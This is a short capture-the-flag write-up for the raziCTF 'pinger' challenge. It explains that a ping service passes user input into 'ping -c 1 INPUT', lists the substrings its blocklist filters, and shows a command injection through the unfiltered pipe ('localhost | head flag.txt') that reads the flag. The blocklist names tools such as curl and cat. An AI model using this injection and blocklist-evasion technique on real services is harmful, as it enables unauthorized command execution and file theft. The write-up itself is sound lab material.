nc 130.185.122.155 1212 

By analysing the binary with ghidra we find that the server executes our input, altough with a few caveats.
The input is executed with the command ```ping -c 1 INPUT```. The biggest problem however is that if the INPUT
contains any of the following, the program exits:
```
cat
echo
python
print
'&&'
;
\
)
(
*
^
%
$
!
ls
curl
get
@
#
```
One noticeable symbol that isn't filtered is the pipe, |. Thus we can arbitrarily execute commands by not using any of the disallowed substrings, by running "localhost | COMMAND". All we want to do is run ls and then cat the flag, so we find alternatives. "dir" is an alternative for ls, and by running dir we see that there's a flag "flag.txt". As an alternative for cat, either head or tail works (assuming that the flag.txt simply contains one row which is the flag).

```
~/CTF/events/raziCTF/pwn/pinger ❯ nc 130.185.122.155 1212                                    х INT took 54s
Welcome to our ping serivce
 tell me what to ping 
 ping localhost | head flag.txt
RaziCTF{!_jus7_w4nt3d_t0_h3lp}
^C
```